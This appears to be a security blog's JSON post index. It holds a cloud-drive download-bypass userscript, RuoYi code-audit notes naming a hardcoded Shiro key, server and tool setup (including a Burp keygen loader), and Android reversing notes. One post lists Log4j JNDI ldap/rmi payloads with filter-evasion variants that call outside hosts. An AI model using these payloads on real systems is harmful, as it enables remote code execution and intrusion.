&#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;yidong-button pl-button&quot;&gt;下载助手&lt;ul class=&quot;pl-dropdown-menu&quot; style=&quot;top: 36px;&quot;&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;aria&quot; &gt;Aria下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.removeClass(&#x27;yidong-button&#x27;).addClass(&#x27;yidong-share-button&#x27;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; base.createDownloadIframe(); this.addPageListener(); &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;yidong-button pl-button-init&quot;&gt;下载助手&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.removeClass(&#x27;yidong-button&#x27;).addClass(&#x27;yidong-share-button&#x27;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; $button.click(() =&gt; base.initDialog()); &#125;, getRandomString(len) &#123; len = len || 16; let $chars = &#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27;; let maxPos = $chars.length; let pwd = &#x27;&#x27;; for (let i = 0; i &lt; len; i++) &#123; pwd += $chars.charAt(Math.floor(Math.random() * maxPos)); &#125; return pwd; &#125;, utob(str) &#123; const u = String.fromCharCode; return str.replace(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFFF]|[^\\x00-\\x7F]/g, (t) =&gt; &#123; if (t.length &lt; 2) &#123; let e = t.charCodeAt(0); return e &lt; 128 ? t : e &lt; 2048 ? u(192 | e &gt;&gt;&gt; 6) + u(128 | 63 &amp; e) : u(224 | e &gt;&gt;&gt; 12 &amp; 15) + u(128 | e &gt;&gt;&gt; 6 &amp; 63) + u(128 | 63 &amp; e); &#125; e = 65536 + 1024 * (t.charCodeAt(0) - 55296) + (t.charCodeAt(1) - 56320); return u(240 | e &gt;&gt;&gt; 18 &amp; 7) + u(128 | e &gt;&gt;&gt; 12 &amp; 63) + u(128 | e &gt;&gt;&gt; 6 &amp; 63) + u(128 | 63 &amp; e); &#125;); &#125;, getSign(e, t, a, n) &#123; let r = &quot;&quot;, i = &quot;&quot;; if (t) &#123; let s = Object.assign(&#123;&#125;, t); i = JSON.stringify(s), i = i.replace(/\\s*/g, &quot;&quot;), i = encodeURIComponent(i); let c = i.split(&quot;&quot;), u = c.sort(); i = u.join(&quot;&quot;); &#125; let A = md5(base.e(this.utob(i))); let l = md5(a + &quot;:&quot; + n); return md5(A + l).toUpperCase(); &#125;, async getFileUrlByOnce(item, index) &#123; try &#123; if (item.downloadUrl) return &#123; index, downloadUrl: item.downloadUrl &#125;; if (this.detectPage() === &#x27;home&#x27;) &#123; let body = &#123; &quot;appName&quot;: &quot;&quot;, &quot;contentID&quot;: item.contentID, &quot;commonAccountInfo&quot;: &#123;&quot;account&quot;: item.owner, &quot;accountType&quot;: 1&#125; &#125;; let time = new Date(+new Date() + 8 * 3600 * 1000).toJSON().substr(0, 19).replace(&#x27;T&#x27;, &#x27; &#x27;); let key = this.getRandomString(16); let sign = this.getSign(undefined, body, time, key); let res = await base.post(pan.pcs[0], body, &#123; &#x27;x-huawei-channelSrc&#x27;: &#x27;10000034&#x27;, &#x27;x-inner-ntwk&#x27;: &#x27;2&#x27;, &#x27;mcloud-channel&#x27;: &#x27;1000101&#x27;, &#x27;mcloud-client&#x27;: &#x27;10701&#x27;, &#x27;mcloud-sign&#x27;: time + &quot;,&quot; + key + &quot;,&quot; + sign, &#x27;content-type&#x27;: &quot;application/json;charset=UTF-8&quot;, &#x27;caller&#x27;: &#x27;web&#x27;, &#x27;CMS-DEVICE&#x27;: &#x27;default&#x27;, &#x27;x-DeviceInfo&#x27;: &#x27;||9|85.0.4183.83|chrome|85.0.4183.83|||windows 10||zh-CN|||&#x27;, &#x27;x-SvcType&#x27;: &#x27;1&#x27;, &#125;); if (res.success) &#123; return &#123; index, downloadUrl: res.data.downloadURL &#125;; &#125; else &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125; if (this.detectPage() === &#x27;share&#x27;) &#123; let vueDom = document.querySelector(&quot;.home-page&quot;).__vue__; let res = await base.post(pan.pcs[1], `linkId=$&#123;vueDom.linkID&#125;&amp;contentIds=$&#123;encodeURIComponent(vueDom.currentPath.id + &#x27;/&#x27; + item.coID)&#125;&amp;catalogIds=`, &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;); if (res.code === 0) &#123; return &#123; index, downloadUrl: res.data.redrUrl &#125;; &#125; else &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125; &#125; catch (e) &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125;, async getPCSLink() &#123; selectList = this.getSelectedList(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (this.isOnlyFolder()) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; let queue = []; selectList.forEach((item, index) =&gt; &#123; queue.push(this.getFileUrlByOnce(item, index)); &#125;); const res = await Promise.all(queue); res.forEach(val =&gt; &#123; selectList[val.index].downloadUrl = val.downloadUrl; &#125;); let html = this.generateDom(selectList); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; list.forEach((v, i) =&gt; &#123; if (v.dirEtag || v.caName) return; let filename = v.contentName || v.coName; let size = base.sizeFormat(v.contentSize || v.coSize); let dlink = v.downloadUrl; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-api&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, navigator.userAgent); content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; return document.querySelector(&quot;.main_file_list&quot;).__vue__.selectList.map(val =&gt; val.item); &#125; catch (e) &#123; let vueDom = document.querySelector(&quot;.home-page&quot;).__vue__; let fileList = vueDom._computedWatchers.fileList.value; let dirList = vueDom._computedWatchers.dirList.value; let selectedFileIndex = vueDom.selectedFile; let selectedDirIndex = vueDom.selectedDir; let selectFileList = fileList.filter((v, i) =&gt; &#123; return selectedFileIndex.includes(i); &#125;); let selectDirList = dirList.filter((v, i) =&gt; &#123; return selectedDirIndex.includes(i); &#125;); return [...selectFileList, ...selectDirList]; &#125; &#125;, detectPage() &#123; let hostname = location.hostname; if (/^yun/.test(hostname)) return &#x27;home&#x27;; if (/^caiyun/.test(hostname)) return &#x27;share&#x27;; return &#x27;&#x27;; &#125;, isOnlyFolder() &#123; for (let i = 0; i &lt; selectList.length; i++) &#123; if (selectList[i].fileEtag || selectList[i].coName) return false; &#125; return true; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config/yidong?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); base.createTip(); base.registerMenuCommand(); &#125; &#125;; let main = &#123; init() &#123; if (/(pan|yun).baidu.com/.test(location.host)) &#123; baidu.initPanLinker(); &#125; if (/www.aliyundrive.com/.test(location.host)) &#123; ali.initPanLinker(); &#125; if (/cloud.189.cn/.test(location.host)) &#123; tianyi.initPanLinker(); &#125; if (/pan.xunlei.com/.test(location.host)) &#123; xunlei.initPanLinker(); &#125; if (/pan.quark.cn/.test(location.host)) &#123; quark.initPanLinker(); &#125; if (/(yun|caiyun).139.com/.test(location.host)) &#123; yidong.initPanLinker(); &#125; &#125; &#125;; main.init();&#125;)(); 水文完","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://blog.njcit.me/tags/bypass/"}]},{"title":"手机刷机相关","slug":"Android/手机刷机相关","date":"2022-12-29T02:27:45.000Z","updated":"2023-03-22T01:48:54.630Z","comments":true,"path":"2022/12/29/Android/手机刷机相关/","link":"","permalink":"https://blog.njcit.me/2022/12/29/Android/%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA%E7%9B%B8%E5%85%B3/","excerpt":"","text":"愿你刷机半生，归来仍是MIUI 联发科狗都不买 原生固件：https://download.pixelexperience.org/ 原生固件：https://download.lineageos.org/gauguin MIUI官方固件：https://mifirm.net/ 橙狐（orangefox）twrp：https://orangefox.download/zh-CN Magisk：https://github.com/topjohnwu/Magisk/releases LSPosed：https://github.com/LSPosed/LSPosed/releases EdXposed：https://github.com/ElderDrivers/EdXposed Shamiko：https://github.com/LSPosed/LSPosed.github.io/releases JustLive：https://github.com/guyijie1211/JustLive-Android/releases ClashForAndroid：https://github.com/Kr328/ClashForAndroid/releases Postern：https://apkpure.com/postern/com.tunnelworkshop.postern ProxyDroid：https://apkpure.com/proxydroid/org.proxydroid scrcpy：https://github.com/Genymobile/scrcpy","categories":[],"tags":[{"name":"刷机","slug":"刷机","permalink":"https://blog.njcit.me/tags/%E5%88%B7%E6%9C%BA/"}]},{"title":"RuoYi代码审计学习记录","slug":"代码审计/RuoYi代码审计学习记录","date":"2022-12-29T01:07:17.000Z","updated":"2023-06-21T02:26:44.401Z","comments":true,"path":"2022/12/29/代码审计/RuoYi代码审计学习记录/","link":"","permalink":"https://blog.njcit.me/2022/12/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/RuoYi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"前言 总算要开始学习代码审计了，正好看到一篇比较好的代码审计的文章，跟着学习一点皮毛，顺便记录一下。基本都是抄的，推荐去看原文，文章地址：https://mp.weixin.qq.com/s/xpC9WGUKvoIkrdDmRdwMaQ 参考文章：https://xz.aliyun.com/t/11928 基础配置 工具配置 JDK 1.8下载地址 推荐使用IntelliJ IDEA Ultimate版本，下载地址：IntelliJ IDEA，学生可以免费领专业版，有钱可以支持正版，没钱淘宝买个学生账号。 推荐Free MyBatis Tool插件和官方中文语言包，其他的看着装就行。 Free MyBatis Tool插件可以快速定位MyBatis调用代码，例如： 环境搭建 RuoYi版本：v4.2，下载地址，下载4.2的版本就行 使用idea直接打开项目，找到RuoYi-v4.2-admin.yml，修改web端口（可选） 打开RuoYi-v4.2-admin-druid.yml，修改数据库相关信息 mysql Ver 8.0.30 for Linux on x86_64 不允许root远程登录，可以使用以下方法缓解 123456789CREATE USER &#x27;username&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;;GRANT ALL PRIVILEGES ON *.* TO &#x27;username&#x27;@&#x27;localhost&#x27; WITH GRANT OPTION;CREATE USER &#x27;username&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27;;GRANT ALL PRIVILEGES ON *.* TO &#x27;username&#x27;@&#x27;%&#x27; WITH GRANT OPTION;FLUSH PRIVILEGES; 创建数据库并导入 1234create database ry;use ry;source /opt/quartz.sqlsource /opt/ry_20200323.sql 启动环境 访问http://127.0.0.1:8081/login，自带用户名密码，没有的话试试admin/admin123 基础环境配置到此结束。 漏洞分析 Shiro反序列化漏洞 为啥说这篇文章好呢，因为他把你每个步骤需要按的键都给你了，这里就依葫芦画瓢。根据文章可知，一般情况下shiro的配置文件在shiroconfig.java中，在idea中，如果你想搜索全部代码的话，快捷键是按两次Shift，这里按两下shift然后搜索shiroconfig，结果如下： 在shiroconfig.java中搜索key可以找到shiro加密使用的密钥fCq+/xW488hMTCD+cmJ3aQ==，这里要注意，加密的方式是gcm： 查看设置的cookie: shiro反序列化导致rce可以参考链接，这里就不多讲了，主要是我也不会。 SQL注入 这个版本官方发布了一些sql注入的补丁，具体注入点我们可以通过使用idea进行全局搜索来进行查找，在idea中按两次shift可以调出全局的搜索框，搜索常见的可以存在注入的点${xxx}找到的结果如下： 这里先定位到id为selectDeptList的sql语句，通过使用插件可以快速定位到Java代码：","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"powershell配置","slug":"杂项/powershell配置","date":"2022-12-27T09:13:20.000Z","updated":"2022-12-27T09:13:51.656Z","comments":true,"path":"2022/12/27/杂项/powershell配置/","link":"","permalink":"https://blog.njcit.me/2022/12/27/%E6%9D%82%E9%A1%B9/powershell%E9%85%8D%E7%BD%AE/","excerpt":"","text":"12345678910111213141516171819oh-my-posh init pwsh --config &#x27;C:\\Users\\ccadmin\\AppData\\Local\\Programs\\oh-my-posh\\themes\\ys.omp.json&#x27; | Invoke-ExpressionNew-Alias -Name ifconfig -Value ipconfigfunction sqlmap&#123; python D:\\tools\\sqlmap\\sqlmap.py @Args&#125;function get_ip&#123; curl https://www.taobao.com/help/getip.php&#125;# Import the Chocolatey Profile that contains the necessary code to enable# tab-completions to function for `choco`.# Be aware that if you are missing these lines from your profile, tab completion# for `choco` will not function.# See https://ch0.co/tab-completion for details.$ChocolateyProfile = &quot;$env:ChocolateyInstall\\helpers\\chocolateyProfile.psm1&quot;if (Test-Path($ChocolateyProfile)) &#123; Import-Module &quot;$ChocolateyProfile&quot;&#125;Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete","categories":[],"tags":[{"name":"powershell","slug":"powershell","permalink":"https://blog.njcit.me/tags/powershell/"}]},{"title":"OracleLinux_lamp基础配置","slug":"杂项/OracleLinux-lamp基础配置","date":"2022-12-27T08:52:46.000Z","updated":"2023-06-21T02:26:44.284Z","comments":true,"path":"2022/12/27/杂项/OracleLinux-lamp基础配置/","link":"","permalink":"https://blog.njcit.me/2022/12/27/%E6%9D%82%E9%A1%B9/OracleLinux-lamp%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/","excerpt":"","text":"一些基础配置 配置静态IP 1234ip addrnmcli con mod ens160 ipv4.addresses 192.168.20.138/24nmcli con mod ens160 ipv4.gateway 192.168.20.1nmcli con mod ens160 ipv4.dns 223.5.5.5 安装lamp 12yum install vim wget curl gityum install httpd mysql-server php* 启动服务 1234systemctl start httpdsystemctl start mysqldsystemctl enable httpdsystemctl enable mysqld 配置MySQL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@localhost ~]# mysql_secure_installationSecuring the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD COMPONENT can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD component?Press y|Y for Yes, any other key for No: yThere are three levels of password validation policy:LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 0Please set the password for root here.New password:Re-enter new password:Estimated strength of the password: 50Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : yBy default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.Normally, root should only be allowed to connect from&#x27;localhost&#x27;. This ensures that someone cannot guess atthe root password from the network.Disallow root login remotely? (Press y|Y for Yes, any other key for No) : n ... skipping.By default, MySQL comes with a database named &#x27;test&#x27; thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database...Success. - Removing privileges on test database...Success.Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! 测试MySQL 开放web端口 12firewall-cmd --add-service=http --permanentfirewall-cmd --reload 访问测试","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.njcit.me/tags/Linux/"}]},{"title":"firefox代理的一些配置","slug":"渗透记录/firefox代理的一些配置","date":"2022-12-22T12:02:57.000Z","updated":"2022-12-22T12:11:10.825Z","comments":true,"path":"2022/12/22/渗透记录/firefox代理的一些配置/","link":"","permalink":"https://blog.njcit.me/2022/12/22/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/firefox%E4%BB%A3%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/","excerpt":"","text":"火狐代理配置 插件下载地址：https://addons.mozilla.org/zh-CN/firefox/addon/switchyomega/ 12345678127.0.0.1[::1]localhost*.mozilla.org*.mozilla.com*.firefox.com*.firefox.org*.mozilla.net # burpsuite启动脚本 burp下载地址：https://portswigger.net/burp/releases loader下载地址：https://github.com/h3110w0r1d-y/BurpLoaderKeygen 12PS D:\\pentest\\burpsuite\\jre\\jdk-17.0.5&gt; cat .\\start.vbsCreateObject(&quot;WScript.Shell&quot;).Run &quot;D:\\pentest\\burpsuite\\jre\\jdk-17.0.5\\bin\\java.exe -jar D:\\pentest\\burpsuite\\jre\\jdk-17.0.5\\BurpLoaderKeygen.jar&quot;,0","categories":[],"tags":[{"name":"burpsuite","slug":"burpsuite","permalink":"https://blog.njcit.me/tags/burpsuite/"},{"name":"火狐","slug":"火狐","permalink":"https://blog.njcit.me/tags/%E7%81%AB%E7%8B%90/"}]},{"title":"log4j_payload","slug":"poc_exp/log4j-payload","date":"2022-12-16T07:07:51.000Z","updated":"2022-12-16T07:09:50.140Z","comments":true,"path":"2022/12/16/poc_exp/log4j-payload/","link":"","permalink":"https://blog.njcit.me/2022/12/16/poc_exp/log4j-payload/","excerpt":"","text":"常用log4j payload 以及绕过 1234567891011121314$&#123;jndi:ldap://xxx.dnslog.cn&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://asdasd.asdasd.asdasd/ass&#125;$&#123;jndi:rmi://adsasd.asdasd.asdasd&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxx xxxx.xx/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1:1389/ass&#125;$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1:1389/ass&#125;$&#123;jndi:rmi://a.b.c&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://q.w.e/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://a.s.d/poc&#125;abcd-$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;-aksdkashkd-- 来源： https://mp.weixin.qq.com/s/VmUh49pHcEumJIKsulW3gw","categories":[],"tags":[{"name":"exp","slug":"exp","permalink":"https://blog.njcit.me/tags/exp/"}]},{"title":"Android逆向笔记","slug":"Android/Android逆向笔记","date":"2022-12-07T06:31:16.000Z","updated":"2023-06-21T02:26:44.376Z","comments":true,"path":"2022/12/07/Android/Android逆向笔记/","link":"","permalink":"https://blog.njcit.me/2022/12/07/Android/Android%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Android 逆向笔记 查找入口activity 搜索android.intent.action.MAIN,上面的就是入口 123456&lt;activity android:theme=&quot;@style/base_AppTheme&quot; android:name=&quot;com.sport.SplashActivity&quot; android:exported=&quot;true&quot; android:initOrder=&quot;1361&quot; android:screenOrientation=&quot;portrait&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; android:initOrder=&quot;1361&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; android:initOrder=&quot;1361&quot;/&gt; &lt;/intent-filter&gt; 